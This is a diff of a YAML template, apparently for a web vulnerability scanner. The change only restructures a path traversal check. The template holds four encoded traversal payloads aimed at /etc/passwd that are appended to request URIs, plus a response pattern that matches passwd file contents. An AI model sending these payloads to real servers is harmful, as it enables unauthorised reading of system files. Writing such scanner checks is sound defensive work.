@@ -1,19 +1,19 @@
 generate:
-        payload: 
-        - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
-        - /../../../../../../../../../etc/passwd
-        - ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
-        - ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
-        into: URI
-        method: 
-        - postfix
+        - payload: 
+                - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
+                - /../../../../../../../../../etc/passwd
+                - ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+                - ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
+        - into: URI
+        - method: 
+                - postfix
 detect:
         - response:
                 - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
 meta-info:
-        type: ptrav
-        threat: 80
-        tags:
+        - type: ptrav
+        - threat: 80
+        - tags:
                 - Path Traversal
                 - Arbitrary File Reading
                 - Misconfiguration
